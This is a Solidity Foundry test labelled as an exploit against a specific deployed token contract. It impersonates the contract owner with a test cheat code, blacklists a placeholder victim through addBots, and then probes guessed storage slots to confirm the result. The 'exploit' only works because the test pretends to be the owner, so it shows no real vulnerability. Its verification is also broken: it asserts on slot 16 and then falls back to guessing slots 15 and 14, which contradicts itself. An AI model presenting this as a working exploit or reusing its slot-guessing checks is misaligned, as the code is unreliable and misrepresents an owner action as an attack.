pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ILPP {
    function owner() external view returns (address);
    function addBots(address[] memory _botAddress, bool _status) external;
    function transferOwnership(address newOwner) external;
    function transfer(address to, uint256 amount) external returns (bool);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF14fE8ea9D35cCEA2545985d7541CcAd02cb6112;
    address attacker = address(this);
    address victim;
    address currentOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        victim = address(0x1234567890123456789012345678901234567890);
        vm.label(victim, "Victim Address");

        // Get the current owner of the contract
        currentOwner = ILPP(TARGET).owner();
        vm.label(currentOwner, "Current Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the current owner
        vm.startPrank(currentOwner);

        // Step 2: Create array with victim address
        address[] memory bots = new address[](1);
        bots[0] = victim;

        // Step 3: Call addBots to blacklist the victim
        ILPP(TARGET).addBots(bots, true);

        vm.stopPrank();

        // Step 4: Verify the exploit worked by checking storage
        // botlist is a mapping(address => bool)
        // In storage layout: 
        // - mapping slots don't store the mapping data directly
        // - For mapping(address => bool) at slot X, the value for key K is at keccak256(abi.encode(K, X))
        // Based on state variable order, botlist should be at slot 16
        // Let's try slot 16
        uint256 mappingSlot = 16;
        bytes32 slot = keccak256(abi.encode(uint256(uint160(victim)), mappingSlot));
        bytes32 value = vm.load(TARGET, slot);

        // In Solidity, bool true is stored as 1, false as 0
        uint256 boolValue = uint256(value);
        assertEq(boolValue, 1, "botlist[victim] should be true (1)");

        // Also try slot 15 just in case
        mappingSlot = 15;
        slot = keccak256(abi.encode(uint256(uint160(victim)), mappingSlot));
        value = vm.load(TARGET, slot);
        boolValue = uint256(value);

        if (boolValue == 1) {
            // Found at slot 15
            assertEq(boolValue, 1, "botlist[victim] should be true (1) at slot 15");
        } else {
            // Try slot 14
            mappingSlot = 14;
            slot = keccak256(abi.encode(uint256(uint160(victim)), mappingSlot));
            value = vm.load(TARGET, slot);
            boolValue = uint256(value);
            assertEq(boolValue, 1, "botlist[victim] should be true (1) at slot 14");
        }
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
